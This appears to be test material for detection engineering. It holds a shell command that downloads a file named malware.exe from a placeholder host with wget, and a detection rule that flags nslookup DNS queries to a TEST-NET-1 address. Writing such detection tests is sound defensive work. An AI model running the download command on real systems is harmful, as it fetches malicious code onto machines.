mkdir -p /tmp/scratch
wget -O /tmp/scratch/malware.exe https://example.com/malware.exe

biocs.name: Suspicious DNS Query
biocs.description: Detects DNS queries to IP addresses in the TEST-NET-1 range
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip in ('192.0.2.1')
| filter dst_port = 53
| filter action_process_image_name = 'nslookup.exe'
